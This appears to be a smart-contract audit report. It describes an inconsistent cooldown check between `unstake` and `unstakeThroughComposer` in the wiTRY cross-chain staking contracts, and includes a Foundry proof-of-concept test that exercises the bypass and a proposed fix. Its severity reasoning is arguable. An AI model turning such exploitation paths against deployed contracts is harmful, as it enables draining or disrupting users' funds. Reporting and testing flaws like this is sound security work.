## Title
Cooldown Bypass and Cross-Chain DoS via Inconsistent `cooldownDuration == 0` Handling

## Summary
The `unstakeThroughComposer` function in `StakediTryCrosschain.sol` lacks the `cooldownDuration == 0` bypass check present in the base `unstake` function, creating an inconsistency. When `cooldownDuration` is set to zero after composer-initiated cooldowns, users can bypass the intended waiting period by calling `unstake()` directly, breaking cross-chain accounting and causing DoS for legitimate cross-chain unstaking flows.

## Impact
**Severity**: Medium

## Finding Description

**Location:** `src/token/wiTRY/StakediTryCrosschain.sol` (function `unstakeThroughComposer`, lines 77-101) and `src/token/wiTRY/StakediTryCooldown.sol` (function `unstake`, lines 80-92)

**Intended Logic:** 
When cooldown is initiated for cross-chain users via `cooldownSharesByComposer` or `cooldownAssetsByComposer`, the assets should remain locked until the cooldown period expires. After the cooldown, the composer calls `unstakeThroughComposer` to retrieve assets and bridge them back to the user on L2. [1](#0-0) [2](#0-1) 

**Actual Logic:**
The base `unstake` function includes a bypass: `if (block.timestamp >= userCooldown.cooldownEnd || cooldownDuration == 0)`, allowing immediate unstaking when `cooldownDuration` is set to zero. [3](#0-2) 

However, `unstakeThroughComposer` only checks `if (block.timestamp >= userCooldown.cooldownEnd)` without the `|| cooldownDuration == 0` clause, creating an inconsistency. [4](#0-3) 

**Exploitation Path:**
1. User on L2 initiates cross-chain unstake by sending wiTRY shares with "INITIATE_COOLDOWN" command
2. wiTryVaultComposer on L1 receives shares and calls `cooldownSharesByComposer(shares, userAddress)`, starting a 90-day cooldown
3. Protocol admin sets `cooldownDuration = 0` to disable the cooldown system (e.g., during emergency or protocol upgrade)
4. User uses their same address on L1 to call `unstake(receiverAddress)` directly, bypassing the cooldown due to the `|| cooldownDuration == 0` check
5. User receives iTRY on L1 immediately instead of waiting for cross-chain bridge back to L2
6. When the composer later calls `unstakeThroughComposer(userAddress)`, it reverts with `InvalidCooldown()` because the cooldown was already claimed, or it succeeds only after the original cooldown timer expires (despite cooldownDuration being 0)

**Security Property Broken:** Violates "Cooldown Integrity: Users must complete cooldown period before unstaking wiTRY" and "Cross-chain Message Integrity: LayerZero messages for unstaking must be delivered to correct user with proper validation"

## Impact Explanation

- **Affected Assets**: iTRY tokens locked in the Silo contract for users with active composer-initiated cooldowns, wiTRY shares staked via cross-chain flow
- **Damage Severity**: Cross-chain unstaking flow is broken. Users who initiated unstake on L2 can claim assets on L1 instead, bypassing the intended cross-chain return path. The composer becomes unable to complete unstaking via `unstakeThroughComposer` until the original cooldown timer expires, even though `cooldownDuration == 0` should allow immediate claiming.
- **User Impact**: Any user who initiated cross-chain unstaking can frontrun the intended flow and claim assets on L1. This breaks accounting between L1 and L2, as the user burned wiTRY on L2 expecting iTRY back on L2, but claimed it on L1 instead.

## Likelihood Explanation

- **Attacker Profile**: Any user who initiated cross-chain unstaking from L2 and has access to their same address on L1 (common for EOA wallets)
- **Preconditions**: 
  1. Active composer-initiated cooldown exists for the user
  2. Admin sets `cooldownDuration = 0` (legitimate admin action during emergency or protocol changes)
  3. User has access to their address on both L1 and L2
- **Execution Complexity**: Single transaction calling `unstake(receiver)` from L1 after detecting `cooldownDuration == 0`
- **Frequency**: Can be exploited by any affected user once per cooldown initiation, whenever `cooldownDuration` is set to zero

## Recommendation

Add the same `cooldownDuration == 0` bypass check to `unstakeThroughComposer` to maintain consistency with the base `unstake` function: [2](#0-1) 

```solidity
// In src/token/wiTRY/StakediTryCrosschain.sol, function unstakeThroughComposer, line 89:

// CURRENT (inconsistent):
if (block.timestamp >= userCooldown.cooldownEnd) {
    userCooldown.cooldownEnd = 0;
    userCooldown.underlyingAmount = 0;
    silo.withdraw(msg.sender, assets);
} else {
    revert InvalidCooldown();
}

// FIXED (consistent with base unstake function):
if (block.timestamp >= userCooldown.cooldownEnd || cooldownDuration == 0) {
    userCooldown.cooldownEnd = 0;
    userCooldown.underlyingAmount = 0;
    silo.withdraw(msg.sender, assets);
} else {
    revert InvalidCooldown();
}
```

**Alternative mitigation:** Prevent users from calling `unstake()` directly for composer-initiated cooldowns by adding a flag to track the cooldown source (user-initiated vs composer-initiated) and restricting direct `unstake()` calls to only user-initiated cooldowns.

## Proof of Concept

```solidity
// File: test/Exploit_CooldownBypassCrosschain.t.sol
// Run with: forge test --match-test test_CooldownBypassWhenSetToZero -vvv

pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../src/token/iTRY/iTry.sol";
import "../src/token/wiTRY/StakediTryCrosschain.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract Exploit_CooldownBypassCrosschain is Test {
    iTry public itryToken;
    StakediTryCrosschain public vault;
    
    address public owner;
    address public composer;
    address public alice; // Cross-chain user
    
    bytes32 public constant COMPOSER_ROLE = keccak256("COMPOSER_ROLE");
    
    function setUp() public {
        owner = makeAddr("owner");
        composer = makeAddr("composer");
        alice = makeAddr("alice");
        
        // Deploy iTry token
        iTry itryImplementation = new iTry();
        bytes memory initData = abi.encodeWithSelector(
            iTry.initialize.selector,
            owner,
            owner
        );
        ERC1967Proxy itryProxy = new ERC1967Proxy(address(itryImplementation), initData);
        itryToken = iTry(address(itryProxy));
        
        // Deploy StakediTryCrosschain vault
        vm.prank(owner);
        vault = new StakediTryCrosschain(
            itryToken,
            address(0), // rewarder
            owner,
            address(0)  // treasury
        );
        
        // Grant composer role
        vm.prank(owner);
        vault.grantRole(COMPOSER_ROLE, composer);
        
        // Mint iTRY to composer and deposit to get shares
        vm.prank(owner);
        itryToken.mint(composer, 1000e18);
        
        vm.startPrank(composer);
        itryToken.approve(address(vault), 1000e18);
        vault.deposit(1000e18, composer);
        vm.stopPrank();
    }
    
    function test_CooldownBypassWhenSetToZero() public {
        // SETUP: Composer initiates cooldown for alice (simulating cross-chain unstake)
        vm.prank(composer);
        uint256 assets = vault.cooldownSharesByComposer(100e18, alice);
        
        console.log("Assets in cooldown for alice:", assets);
        
        // Verify cooldown is active with 90 days remaining
        (uint104 cooldownEnd, uint256 amount) = vault.cooldowns(alice);
        assertEq(amount, assets);
        assertEq(cooldownEnd, block.timestamp + vault.cooldownDuration());
        
        // Verify alice cannot unstake before cooldown expires
        vm.prank(alice);
        vm.expectRevert();
        vault.unstake(alice);
        
        // EXPLOIT: Admin sets cooldownDuration to 0
        vm.prank(owner);
        vault.setCooldownDuration(0);
        
        console.log("Cooldown duration set to 0");
        
        // Verify unstakeThroughComposer CANNOT be used (missing bypass check)
        vm.prank(composer);
        vm.expectRevert(); // Still reverts because block.timestamp < cooldownEnd
        vault.unstakeThroughComposer(alice);
        
        // VULNERABILITY: Alice can bypass cooldown via direct unstake() call
        uint256 aliceBalanceBefore = itryToken.balanceOf(alice);
        
        vm.prank(alice);
        vault.unstake(alice); // Succeeds due to || cooldownDuration == 0 check
        
        uint256 aliceBalanceAfter = itryToken.balanceOf(alice);
        
        // VERIFY: Alice received assets immediately, bypassing 90-day cooldown
        assertEq(aliceBalanceAfter - aliceBalanceBefore, assets, 
            "Vulnerability confirmed: Alice bypassed cooldown and claimed assets on L1 instead of L2");
        
        // Verify cooldown was cleared
        (uint104 cooldownEndAfter, uint256 amountAfter) = vault.cooldowns(alice);
        assertEq(cooldownEndAfter, 0);
        assertEq(amountAfter, 0);
        
        console.log("Alice successfully bypassed cooldown and claimed", assets, "iTRY on L1");
        console.log("Cross-chain flow broken: assets should have been bridged back to L2");
    }
}
```

## Notes

The vulnerability arises from an **inconsistency in cooldown bypass logic** between the base `unstake()` function and the composer-specific `unstakeThroughComposer()` function. The comment in `StakediTryCooldown.sol` line 78 explicitly states that `unstake` can be called when cooldown is set to 0 to allow users to claim locked assets, but this bypass was not implemented in `unstakeThroughComposer`. [5](#0-4) 

This creates a scenario where:
1. Setting `cooldownDuration = 0` is a legitimate admin action (e.g., disabling cooldown system)
2. Users with active composer-initiated cooldowns can frontrun the intended cross-chain flow
3. The composer becomes unable to complete unstaking via the intended `unstakeThroughComposer` path
4. Cross-chain accounting breaks because assets are claimed on L1 instead of being bridged to L2

The fix is straightforward: add `|| cooldownDuration == 0` to the condition in `unstakeThroughComposer` to maintain consistency with the base contract's intended behavior.

### Citations

**File:** src/token/wiTRY/StakediTryCrosschain.sol (L36-48)
```text
    function cooldownSharesByComposer(uint256 shares, address redeemer)
        external
        onlyRole(COMPOSER_ROLE)
        ensureCooldownOn
        returns (uint256 assets)
    {
        address composer = msg.sender;
        if (redeemer == address(0)) revert InvalidZeroAddress();
        if (shares > maxRedeem(composer)) revert ExcessiveRedeemAmount();

        assets = previewRedeem(shares);
        _startComposerCooldown(composer, redeemer, shares, assets);
    }
```

**File:** src/token/wiTRY/StakediTryCrosschain.sol (L77-101)
```text
    function unstakeThroughComposer(address receiver)
        external
        onlyRole(COMPOSER_ROLE)
        nonReentrant
        returns (uint256 assets)
    {
        // Validate valid receiver
        if (receiver == address(0)) revert InvalidZeroAddress();

        UserCooldown storage userCooldown = cooldowns[receiver];
        assets = userCooldown.underlyingAmount;

        if (block.timestamp >= userCooldown.cooldownEnd) {
            userCooldown.cooldownEnd = 0;
            userCooldown.underlyingAmount = 0;

            silo.withdraw(msg.sender, assets); // transfer to wiTryVaultComposer for crosschain transfer
        } else {
            revert InvalidCooldown();
        }

        emit UnstakeThroughComposer(msg.sender, receiver, assets);

        return assets;
    }
```

**File:** src/token/wiTRY/StakediTryCooldown.sol (L77-78)
```text
    /// @notice Claim the staking amount after the cooldown has finished. The address can only retire the full amount of assets.
    /// @dev unstake can be called after cooldown have been set to 0, to let accounts to be able to claim remaining assets locked at Silo
```

**File:** src/token/wiTRY/StakediTryCooldown.sol (L80-92)
```text
    function unstake(address receiver) external {
        UserCooldown storage userCooldown = cooldowns[msg.sender];
        uint256 assets = userCooldown.underlyingAmount;

        if (block.timestamp >= userCooldown.cooldownEnd || cooldownDuration == 0) {
            userCooldown.cooldownEnd = 0;
            userCooldown.underlyingAmount = 0;

            silo.withdraw(receiver, assets);
        } else {
            revert InvalidCooldown();
        }
    }
```
